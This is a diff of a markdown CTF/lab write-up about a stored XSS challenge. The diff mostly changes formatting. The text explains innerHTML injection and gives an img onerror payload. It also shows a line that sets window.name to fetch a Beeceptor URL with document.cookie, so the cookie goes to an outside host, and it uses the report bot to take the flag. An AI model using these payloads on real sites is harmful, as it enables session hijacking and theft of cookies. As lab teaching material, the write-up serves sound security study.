@@ -12,7 +12,7 @@ date: 2023-05-13
 Challenge: https://note.ctf.zoolab.org/
 
 ## Background
-[](https://www.wibibi.com/info.php?tid=402)
+[JavaScript innerHTML 與 innerText 的差異](https://www.wibibi.com/info.php?tid=402)
 
 ## Source Code
 ```javascript
@@ -52,13 +52,12 @@ According to the response, it seems has no filter of our input, so, we can choos
 According to [javascript documentation](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)
     > It is not uncommon to see innerHTML used to insert text into a web page. There is potential for this to become an attack vector on a site, creating a potential security risk. 
     > Although this may look like a cross-site scripting attack, the result is harmless. HTML specifies that a \<script\> tag inserted with innerHTML should not execute.
-
+    > 
     > However, there are ways to execute JavaScript without using \<script\> elements, so there is still a security risk whenever you use innerHTML to set strings over which you have no control. For example: 
-    
-    ```javascript
-    const name = "<img src='x' onerror='fetch()'>";
-    el.innerHTML = name; // shows the alert
-    ```
+    > ```javascript
+    > const name = "<img src='x' onerror='fetch()'>";
+    > el.innerHTML = name; // shows the alert
+    > ```
 
 2. Use `img` tag
 Payload: `<img src='x' onerror='alert(1)'>`
@@ -70,7 +69,7 @@ If we set:
     ```javascript
     top.name = 'fetch("https://sbk6401.free.beeceptor.com?sh="+document.cookie)'
     ```
-    Furthermore, we set our title as:<font color="FF0000">`<img src=x onerror=eval(window.name)>`</font>
+    Furthermore, we set our title as:**`<img src=x onerror=eval(window.name)>`**
 
     Then if we reload this page, it'll execute the command in `top.name`
     ![](https://i.imgur.com/B8aRmbN.png)
@@ -82,20 +81,7 @@ Then we can change the Report URL as what we set in `Beeceptor`
 ![](https://i.imgur.com/fVTg6oI.png)
 
 5. Detail about workflow
-    ```flow
-    st=>start: Start
-    e=>end: get flag in Beeceptor
-    op=>operation: Set title to <img src=x onerror=eval(top.name)>
-    io=>inputoutput: Click Report
-    op2=>operation: Set URL as  https://sbk6401.free.beeceptor.com 
-    op3=>operation: Execute our script that set in beeceptor
-    op4=>operation: Set top.name as our payload
-    op5=>operation: redirect to https://note.ctf.zoolab.org/note/fafe93de9467a6022fb8cb19
-    op6=>operation: eval(top.name)
-
-
-    st->op->io->op2->op3->op4->op5->op6->e
-    ```
+    <img src="/assets/posts/Security Course/Simple Web - 0x08(Lab - Particles.js)-workflow.png" width=300>
 
 ## Reference
 [在XSS测试中如何绕过字符长度限制](https://zhuanlan.zhihu.com/p/93192936)
